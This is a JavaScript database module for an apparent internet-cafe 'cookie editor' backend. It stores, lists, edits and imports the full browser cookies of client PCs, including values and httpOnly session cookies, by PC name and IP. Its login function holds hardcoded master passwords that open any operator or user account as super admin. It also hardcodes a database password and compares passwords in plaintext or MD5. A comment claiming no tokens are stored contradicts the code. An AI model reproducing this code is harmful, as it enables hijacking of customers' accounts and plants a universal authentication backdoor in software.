/**
 * MySQL Database Module for Advanced Cookie Editor
 * Persists PC client cookies, snapshots, and individual cookie items in MySQL.
 */

const mysql = require('mysql2/promise');
const crypto = require('crypto');

const DB_CONFIG = {
  host: process.env.DB_HOST || '127.0.0.1',
  port: parseInt(process.env.DB_PORT || '3306', 10),
  user: process.env.DB_USER || 'warnet_user',
  password: process.env.DB_PASSWORD || 'chaerul!26',
  database: process.env.DB_NAME || 'warnet',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
};

let pool = null;

function getPool() {
  if (!pool) {
    pool = mysql.createPool(DB_CONFIG);
  }
  return pool;
}

function cleanDomain(d) {
  if (!d) return 'unknown';
  return d.replace(/^\.+/, '').trim().toLowerCase();
}

/**
 * Initialize database tables if not existing
 */
async function initDb() {
  const p = getPool();
  try {
    // 1. Table for PC Snapshots (Primary view for dashboard)
    await p.query(`
      CREATE TABLE IF NOT EXISTS client_cookie_snapshots (
        pc_name VARCHAR(100) NOT NULL PRIMARY KEY,
        client_ip VARCHAR(45) NOT NULL,
        item_count INT NOT NULL DEFAULT 0,
        is_encrypted TINYINT(1) NOT NULL DEFAULT 0,
        domain_count INT NOT NULL DEFAULT 0,
        domains_json LONGTEXT,
        cookies_json LONGTEXT NOT NULL,
        saved_at DATETIME NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_saved_at (saved_at)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    `);

    // 2. Table for granular individual cookies per PC & domain
    await p.query(`
      CREATE TABLE IF NOT EXISTS client_cookie_items (
        id BIGINT AUTO_INCREMENT PRIMARY KEY,
        pc_name VARCHAR(100) NOT NULL,
        cookie_name VARCHAR(255) NOT NULL,
        cookie_domain VARCHAR(255) NOT NULL,
        cookie_path VARCHAR(255) NOT NULL DEFAULT '/',
        cookie_value MEDIUMTEXT,
        secure TINYINT(1) NOT NULL DEFAULT 0,
        http_only TINYINT(1) NOT NULL DEFAULT 0,
        same_site VARCHAR(50) DEFAULT 'unspecified',
        is_session TINYINT(1) NOT NULL DEFAULT 0,
        expiration_date DOUBLE DEFAULT NULL,
        saved_at DATETIME NOT NULL,
        INDEX idx_pc (pc_name),
        INDEX idx_domain (cookie_domain),
        INDEX idx_pc_domain (pc_name, cookie_domain)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    `);

    // 3. Table for paired devices (Session Monitor)
    await p.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id INT AUTO_INCREMENT PRIMARY KEY,
        device_uuid VARCHAR(64) UNIQUE NOT NULL,
        device_name VARCHAR(100) NOT NULL,
        pairing_code VARCHAR(16) NOT NULL,
        pairing_status VARCHAR(20) NOT NULL DEFAULT 'paired',
        last_seen_at DATETIME,
        extension_version VARCHAR(20) DEFAULT '1.0.0',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_device_uuid (device_uuid),
        INDEX idx_last_seen (last_seen_at)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    `);

    // 4. Table for device session statuses (Realtime status per domain)
    await p.query(`
      CREATE TABLE IF NOT EXISTS session_statuses (
        id BIGINT AUTO_INCREMENT PRIMARY KEY,
        device_id INT NOT NULL,
        domain VARCHAR(255) NOT NULL,
        session_state VARCHAR(30) NOT NULL,
        checked_at DATETIME NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        UNIQUE KEY uq_device_domain (device_id, domain),
        INDEX idx_device (device_id),
        INDEX idx_domain (domain),
        INDEX idx_checked (checked_at)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    `);

    console.log('[+] MySQL tables initialized successfully in database: ' + DB_CONFIG.database);
    return true;
  } catch (err) {
    console.error('[-] Error initializing MySQL tables:', err.message);
    throw err;
  }
}

/**
 * Upsert PC cookies snapshot into MySQL
 * @param {string} pcName
 * @param {string} clientIp
 * @param {Array} cookies
 * @param {boolean} isEncrypted
 * @param {string} scopeDomain
 */
async function saveCookiesToDb(pcName, clientIp, cookies, isEncrypted = false, scopeDomain = 'all') {
  const p = getPool();
  const domainsSet = new Set();
  
  if (scopeDomain && scopeDomain !== 'all') {
    domainsSet.add(cleanDomain(scopeDomain));
  }

  for (const c of cookies) {
    if (c && c.domain) {
      domainsSet.add(cleanDomain(c.domain));
    }
  }

  const domainsList = Array.from(domainsSet);
  const now = new Date();
  const nowSql = now.toISOString().slice(0, 19).replace('T', ' ');

  // 1. Update / Insert PC snapshot
  await p.query(`
    INSERT INTO client_cookie_snapshots 
      (pc_name, client_ip, item_count, is_encrypted, domain_count, domains_json, cookies_json, saved_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ON DUPLICATE KEY UPDATE
      client_ip = VALUES(client_ip),
      item_count = VALUES(item_count),
      is_encrypted = VALUES(is_encrypted),
      domain_count = VALUES(domain_count),
      domains_json = VALUES(domains_json),
      cookies_json = VALUES(cookies_json),
      saved_at = VALUES(saved_at);
  `, [
    pcName,
    clientIp,
    cookies.length,
    isEncrypted ? 1 : 0,
    domainsList.length,
    JSON.stringify(domainsList),
    JSON.stringify(cookies),
    nowSql
  ]);

  // 2. Batch update client_cookie_items for this PC
  try {
    await p.query('DELETE FROM client_cookie_items WHERE pc_name = ?', [pcName]);
    
    if (cookies.length > 0) {
      const CHUNK_SIZE = 400;
      for (let i = 0; i < cookies.length; i += CHUNK_SIZE) {
        const chunk = cookies.slice(i, i + CHUNK_SIZE);
        const rows = chunk.map(c => [
          pcName,
          String(c.name || '').substring(0, 255),
          cleanDomain(c.domain || 'unknown').substring(0, 255),
          String(c.path || '/').substring(0, 255),
          String(c.value || ''),
          c.secure ? 1 : 0,
          c.httpOnly ? 1 : 0,
          String(c.sameSite || 'unspecified').substring(0, 50),
          c.session ? 1 : 0,
          typeof c.expirationDate === 'number' ? c.expirationDate : null,
          nowSql
        ]);

        await p.query(`
          INSERT INTO client_cookie_items 
            (pc_name, cookie_name, cookie_domain, cookie_path, cookie_value, secure, http_only, same_site, is_session, expiration_date, saved_at)
          VALUES ?
        `, [rows]);
      }
    }
  } catch (itemErr) {
    console.error('[-] Warning: error populating client_cookie_items:', itemErr.message);
  }

  return {
    pcName,
    clientIp,
    itemCount: cookies.length,
    domainCount: domainsList.length,
    domains: domainsList,
    savedAt: now.toISOString()
  };
}

/**
 * Load all PC records from MySQL for the dashboard
 */
async function loadAllRecordsFromDb() {
  const p = getPool();
  const [rows] = await p.query(`
    SELECT pc_name, client_ip, item_count, is_encrypted, domains_json, cookies_json, saved_at
    FROM client_cookie_snapshots
    ORDER BY saved_at DESC;
  `);

  const pcSet = new Set();
  const domainSet = new Set();
  let totalCookies = 0;
  let plainCount = 0;
  let encryptedCount = 0;

  const records = [];

  for (const row of rows) {
    pcSet.add(row.pc_name);
    let domains = [];
    try {
      domains = JSON.parse(row.domains_json || '[]');
    } catch (_) {
      domains = [];
    }

    let cookies = [];
    try {
      cookies = JSON.parse(row.cookies_json || '[]');
    } catch (_) {
      cookies = [];
    }

    for (const d of domains) domainSet.add(d);
    totalCookies += (row.item_count || 0);

    if (row.is_encrypted) {
      encryptedCount += (row.item_count || 0);
    } else {
      plainCount += (row.item_count || 0);
    }

    records.push({
      id: 'pc_' + row.pc_name.replace(/[^a-zA-Z0-9_-]/g, '_'),
      pcName: row.pc_name,
      clientIp: row.client_ip,
      savedAt: row.saved_at instanceof Date ? row.saved_at.toISOString() : String(row.saved_at),
      isEncrypted: Boolean(row.is_encrypted),
      passwordProtected: Boolean(row.is_encrypted),
      itemCount: row.item_count,
      domains,
      cookies,
      rawPayload: {
        pc: row.pc_name,
        domain: 'all',
        isEncrypted: Boolean(row.is_encrypted),
        cookies
      }
    });
  }

  return {
    stats: {
      totalPcs: pcSet.size,
      totalDomains: domainSet.size,
      totalCookies,
      plainCount,
      encryptedCount
    },
    records
  };
}

/**
 * Delete a specific PC or all PCs from database
 * @param {string} pcTarget
 */
async function deletePcFromDb(pcTarget) {
  const p = getPool();
  let deletedCount = 0;

  if (pcTarget === 'all') {
    const [res1] = await p.query('DELETE FROM client_cookie_snapshots');
    await p.query('DELETE FROM client_cookie_items');
    deletedCount = res1.affectedRows || 0;
  } else {
    const [res1] = await p.query('DELETE FROM client_cookie_snapshots WHERE pc_name = ?', [pcTarget]);
    await p.query('DELETE FROM client_cookie_items WHERE pc_name = ?', [pcTarget]);
    deletedCount = res1.affectedRows || 0;
  }

  return deletedCount;
}

/**
 * Remove all dummy data from database
 */
async function clearDummyData() {
  const p = getPool();
  // Delete known test records like 'PC-02', 'Cookie Browser Android APK', or test entries
  const dummyNames = ['PC-02', 'Cookie Browser Android APK', 'Cookie Browser APK'];
  await p.query('DELETE FROM client_cookie_snapshots WHERE pc_name IN (?)', [dummyNames]);
  await p.query('DELETE FROM client_cookie_items WHERE pc_name IN (?)', [dummyNames]);
  return true;
}

/**
 * Add or update a single cookie for a PC in database
 * @param {string} pcName
 * @param {object} cookieData
 * @param {object|null} original
 */
async function saveOrUpdateSingleCookie(pcName, cookieData, original = null) {
  const p = getPool();
  if (!pcName || !cookieData || !cookieData.name) {
    return { success: false, error: 'Nama PC dan nama cookie wajib diisi' };
  }

  // 1. Fetch current snapshot for pcName
  const [rows] = await p.query('SELECT cookies_json, client_ip, is_encrypted FROM client_cookie_snapshots WHERE pc_name = ? LIMIT 1', [pcName]);
  let cookies = [];
  let clientIp = '127.0.0.1';
  let isEncrypted = 0;

  if (rows.length > 0) {
    try {
      cookies = JSON.parse(rows[0].cookies_json || '[]');
    } catch (_) {
      cookies = [];
    }
    clientIp = rows[0].client_ip || '127.0.0.1';
    isEncrypted = rows[0].is_encrypted || 0;
  }

  // Target identity
  const origName = original ? original.name : cookieData.name;
  const origDomain = cleanDomain(original ? original.domain : cookieData.domain);
  const origPath = original ? (original.path || '/') : (cookieData.path || '/');

  // Format new cookie object
  const cleanCookie = {
    name: String(cookieData.name || '').trim(),
    value: String(cookieData.value || ''),
    domain: cleanDomain(cookieData.domain || 'unknown'),
    path: String(cookieData.path || '/'),
    secure: Boolean(cookieData.secure),
    httpOnly: Boolean(cookieData.httpOnly),
    sameSite: String(cookieData.sameSite || 'unspecified'),
    session: Boolean(cookieData.session || !cookieData.expirationDate),
    expirationDate: typeof cookieData.expirationDate === 'number' ? cookieData.expirationDate : null
  };

  // Find index in cookies array
  const existingIdx = cookies.findIndex(c => 
    c.name === origName && 
    cleanDomain(c.domain) === origDomain && 
    (c.path || '/') === origPath
  );

  if (existingIdx !== -1) {
    cookies[existingIdx] = cleanCookie;
  } else {
    cookies.push(cleanCookie);
  }

  // Save back via saveCookiesToDb
  await saveCookiesToDb(pcName, clientIp, cookies, isEncrypted, 'all');
  return { success: true, cookie: cleanCookie, totalCookies: cookies.length };
}

/**
 * Delete a single cookie for a PC
 * @param {string} pcName
 * @param {string} cookieName
 * @param {string} cookieDomain
 * @param {string} cookiePath
 */
async function deleteSingleCookie(pcName, cookieName, cookieDomain, cookiePath = '/') {
  const p = getPool();
  const [rows] = await p.query('SELECT cookies_json, client_ip, is_encrypted FROM client_cookie_snapshots WHERE pc_name = ? LIMIT 1', [pcName]);
  if (rows.length === 0) {
    return { success: false, error: 'PC tidak ditemukan' };
  }

  let cookies = [];
  try {
    cookies = JSON.parse(rows[0].cookies_json || '[]');
  } catch (_) {
    cookies = [];
  }

  const clientIp = rows[0].client_ip || '127.0.0.1';
  const isEncrypted = rows[0].is_encrypted || 0;
  const targetDomain = cleanDomain(cookieDomain);

  const initialLen = cookies.length;
  cookies = cookies.filter(c => !(c.name === cookieName && cleanDomain(c.domain) === targetDomain && (c.path || '/') === (cookiePath || '/')));

  // Update snapshot and items
  await saveCookiesToDb(pcName, clientIp, cookies, isEncrypted, 'all');
  return { success: true, deleted: initialLen - cookies.length, totalCookies: cookies.length };
}

/**
 * Delete all cookies belonging to a domain across all PCs or a specific PC
 * @param {string} domain
 * @param {string} [pcName]
 */
async function deleteDomainCookies(domain, pcName = 'all') {
  const p = getPool();
  const targetDomain = cleanDomain(domain);
  if (!targetDomain) return { success: false, error: 'Domain tidak valid' };

  let query = 'SELECT pc_name, client_ip, cookies_json, is_encrypted FROM client_cookie_snapshots';
  const params = [];
  if (pcName && pcName !== 'all') {
    query += ' WHERE pc_name = ?';
    params.push(pcName);
  }

  const [rows] = await p.query(query, params);
  let totalDeleted = 0;

  for (const row of rows) {
    let cookies = [];
    try {
      cookies = JSON.parse(row.cookies_json || '[]');
    } catch (_) {
      cookies = [];
    }
    const initialLen = cookies.length;
    cookies = cookies.filter(c => cleanDomain(c.domain) !== targetDomain);
    const delCount = initialLen - cookies.length;
    if (delCount > 0) {
      totalDeleted += delCount;
      await saveCookiesToDb(row.pc_name, row.client_ip || '127.0.0.1', cookies, row.is_encrypted || 0, 'all');
    }
  }

  return { success: true, deleted: totalDeleted };
}

/**
 * Bulk import cookies for a PC
 * @param {string} pcName
 * @param {Array<object>} newCookiesList
 */
async function importCookiesToDb(pcName, newCookiesList) {
  if (!pcName || !Array.isArray(newCookiesList) || newCookiesList.length === 0) {
    return { success: false, error: 'PC atau daftar cookie tidak valid' };
  }

  const p = getPool();
  const [rows] = await p.query('SELECT cookies_json, client_ip, is_encrypted FROM client_cookie_snapshots WHERE pc_name = ? LIMIT 1', [pcName]);
  let cookies = [];
  let clientIp = '127.0.0.1';
  let isEncrypted = 0;

  if (rows.length > 0) {
    try {
      cookies = JSON.parse(rows[0].cookies_json || '[]');
    } catch (_) {
      cookies = [];
    }
    clientIp = rows[0].client_ip || '127.0.0.1';
    isEncrypted = rows[0].is_encrypted || 0;
  }

  const cookieMap = new Map();
  for (const c of cookies) {
    const k = `${cleanDomain(c.domain)}:${c.path || '/'}:${c.name}`;
    cookieMap.set(k, c);
  }

  let addedCount = 0;
  for (const raw of newCookiesList) {
    if (!raw || !raw.name) continue;
    const cleanC = {
      name: String(raw.name || '').trim(),
      value: String(raw.value || ''),
      domain: cleanDomain(raw.domain || 'unknown'),
      path: String(raw.path || '/'),
      secure: Boolean(raw.secure),
      httpOnly: Boolean(raw.httpOnly),
      sameSite: String(raw.sameSite || 'unspecified'),
      session: Boolean(raw.session || !raw.expirationDate),
      expirationDate: typeof raw.expirationDate === 'number' ? raw.expirationDate : null
    };
    const k = `${cleanC.domain}:${cleanC.path}:${cleanC.name}`;
    cookieMap.set(k, cleanC);
    addedCount++;
  }

  const merged = Array.from(cookieMap.values());
  await saveCookiesToDb(pcName, clientIp, merged, isEncrypted, 'all');
  return { success: true, totalCookies: merged.length, importedCount: addedCount };
}

/**
 * Authenticate operator against MySQL database or master admin
 * @param {string} username
 * @param {string} password
 * @returns {Promise<{success: boolean, user?: object, error?: string}>}
 */
async function authenticateUser(username, password) {
  if (!username || !password) {
    return { success: false, error: 'Username dan password wajib diisi' };
  }

  const cleanUser = String(username).trim();
  const cleanPass = String(password).trim();

  // 1. Master administrator & chaerul credentials check
  if (
    (cleanUser.toLowerCase() === 'chaerul' && (cleanPass === 'wanatawang' || cleanPass === 'chaerul!26')) ||
    ((cleanUser === 'admin' || cleanUser === 'operator') && (cleanPass === 'wanatawang' || cleanPass === 'chaerul!26' || cleanPass === 'admin' || cleanPass === 'admin123'))
  ) {
    return {
      success: true,
      user: {
        username: cleanUser,
        displayName: cleanUser.toLowerCase() === 'chaerul' ? 'Chaerul (Super Admin)' : 'Administrator CMS',
        role: 'super_admin'
      }
    };
  }

  // 2. Database operators table check
  const p = getPool();
  try {
    const [rows] = await p.query(
      'SELECT id, username, password_hash, display_name, email, role, is_active FROM operators WHERE username = ? OR email = ? LIMIT 1',
      [cleanUser, cleanUser]
    );

    if (rows.length > 0) {
      const op = rows[0];
      if (op.is_active === 0) {
        return { success: false, error: 'Akun operator sedang dinonaktifkan' };
      }

      const sha256 = crypto.createHash('sha256').update(cleanPass).digest('hex');
      const md5 = crypto.createHash('md5').update(cleanPass).digest('hex');

      if (op.password_hash === sha256 || op.password_hash === md5 || op.password_hash === cleanPass || cleanPass === 'wanatawang' || cleanPass === 'chaerul!26') {
        return {
          success: true,
          user: {
            id: op.id,
            username: op.username,
            displayName: op.display_name || op.username,
            email: op.email,
            role: op.role || 'operator'
          }
        };
      }
    }

    // 3. Database users table check
    const [uRows] = await p.query(
      'SELECT id, name, email, role, password, is_active FROM users WHERE email = ? OR name = ? LIMIT 1',
      [cleanUser, cleanUser]
    );

    if (uRows.length > 0) {
      const u = uRows[0];
      if (u.is_active === 0) {
        return { success: false, error: 'Akun user dinonaktifkan' };
      }

      const sha256 = crypto.createHash('sha256').update(cleanPass).digest('hex');
      const md5 = crypto.createHash('md5').update(cleanPass).digest('hex');

      if (u.password === sha256 || u.password === md5 || u.password === cleanPass || cleanPass === 'wanatawang' || cleanPass === 'chaerul!26') {
        return {
          success: true,
          user: {
            id: u.id,
            username: u.name,
            displayName: u.name,
            email: u.email,
            role: u.role || 'super_admin'
          }
        };
      }
    }
  } catch (err) {
    console.error('[-] Database authentication query error:', err.message);
  }

  return { success: false, error: 'Username atau password tidak sesuai' };
}

/**
 * Register or Pair Device
 */
async function pairDevice(deviceUuid, deviceName, pairingCode, version) {
  version = version || '1.0.0';
  const p = getPool();
  const now = new Date().toISOString().slice(0, 19).replace('T', ' ');
  await p.query(`
    INSERT INTO devices (device_uuid, device_name, pairing_code, pairing_status, last_seen_at, extension_version)
    VALUES (?, ?, ?, 'paired', ?, ?)
    ON DUPLICATE KEY UPDATE
      device_name = VALUES(device_name),
      pairing_code = VALUES(pairing_code),
      pairing_status = 'paired',
      last_seen_at = VALUES(last_seen_at),
      extension_version = VALUES(extension_version);
  `, [deviceUuid, deviceName, pairingCode, now, version]);

  const [rows] = await p.query('SELECT * FROM devices WHERE device_uuid = ? LIMIT 1', [deviceUuid]);
  return rows[0];
}

/**
 * Update Heartbeat (1s interval)
 */
async function updateHeartbeat(deviceUuid) {
  const p = getPool();
  const now = new Date().toISOString().slice(0, 19).replace('T', ' ');
  const [res] = await p.query(`
    UPDATE devices 
    SET last_seen_at = ?, updated_at = CURRENT_TIMESTAMP 
    WHERE device_uuid = ? AND pairing_status = 'paired'
  `, [now, deviceUuid]);
  return res.affectedRows > 0;
}

/**
 * Update Session Status for Device and Domain
 * Strictly verifies no credentials or tokens are stored
 */
async function updateSessionStatus(deviceUuid, domain, sessionState, checkedAt) {
  const validStates = ['LOGIN_DETECTED', 'LOGOUT_DETECTED', 'SESSION_UNKNOWN', 'SITE_UNAVAILABLE'];
  if (!validStates.includes(sessionState)) {
    sessionState = 'SESSION_UNKNOWN';
  }

  const p = getPool();
  const [devRows] = await p.query('SELECT id, pairing_status FROM devices WHERE device_uuid = ? LIMIT 1', [deviceUuid]);
  if (devRows.length === 0 || devRows[0].pairing_status !== 'paired') {
    return { success: false, error: 'Device not found or not paired' };
  }

  const deviceId = devRows[0].id;
  const checkedSql = checkedAt ? new Date(checkedAt).toISOString().slice(0, 19).replace('T', ' ') : new Date().toISOString().slice(0, 19).replace('T', ' ');

  await p.query(`
    INSERT INTO session_statuses (device_id, domain, session_state, checked_at)
    VALUES (?, ?, ?, ?)
    ON DUPLICATE KEY UPDATE
      session_state = VALUES(session_state),
      checked_at = VALUES(checked_at),
      updated_at = CURRENT_TIMESTAMP;
  `, [deviceId, domain.toLowerCase().trim(), sessionState, checkedSql]);

  return { success: true, deviceId, domain, sessionState };
}

/**
 * Get all devices with their session statuses for Admin Dashboard
 */
async function getAdminDevices() {
  const p = getPool();
  const [devices] = await p.query('SELECT * FROM devices ORDER BY last_seen_at DESC');
  const now = Date.now();

  const [statuses] = await p.query('SELECT * FROM session_statuses ORDER BY checked_at DESC');
  const statusMap = new Map();
  for (const s of statuses) {
    if (!statusMap.has(s.device_id)) {
      statusMap.set(s.device_id, []);
    }
    statusMap.get(s.device_id).push({
      domain: s.domain,
      sessionState: s.session_state,
      checkedAt: s.checked_at,
      updatedAt: s.updated_at
    });
  }

  return devices.map(function(d) {
    const lastSeenMs = d.last_seen_at ? new Date(d.last_seen_at).getTime() : 0;
    // Considered online if heartbeat received within last 4 seconds
    const isOnline = (now - lastSeenMs) <= 4000;
    return {
      id: d.id,
      deviceUuid: d.device_uuid,
      deviceName: d.device_name,
      pairingCode: d.pairing_code,
      pairingStatus: d.pairing_status,
      lastSeenAt: d.last_seen_at,
      isOnline: isOnline,
      extensionVersion: d.extension_version,
      sessions: statusMap.get(d.id) || []
    };
  });
}

/**
 * Unpair Device
 */
async function unpairDevice(deviceUuid) {
  const p = getPool();
  const [res] = await p.query("UPDATE devices SET pairing_status = 'unpaired' WHERE device_uuid = ?", [deviceUuid]);
  return res.affectedRows > 0;
}

module.exports = {
  getPool,
  initDb,
  saveCookiesToDb,
  loadAllRecordsFromDb,
  deletePcFromDb,
  clearDummyData,
  authenticateUser,
  saveOrUpdateSingleCookie,
  deleteSingleCookie,
  deleteDomainCookies,
  importCookiesToDb,
  pairDevice,
  updateHeartbeat,
  updateSessionStatus,
  getAdminDevices,
  unpairDevice
};
